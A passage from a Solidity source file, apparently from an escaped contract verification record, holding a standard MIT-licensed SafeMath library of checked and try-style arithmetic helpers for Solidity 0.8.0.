09:05\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.0;\r\nlibrary SafeMath {\r\n    function tryAdd(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (bool, uint256)\r\n    {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c \u003c a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function trySub(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (bool, uint256)\r\n    {\r\n        unchecked {\r\n            if (b \u003e a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    function tryMul(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (bool, uint256)\r\n    {\r\n        unchecked {\r\n            // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\r\n            // benefit is lost if \u0027b\u0027 is also tested.\r\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (bool, uint256)\r\n    {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    function tryMod(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (bool, uint256)\r\n    {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003c= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003e 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003e 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}"}}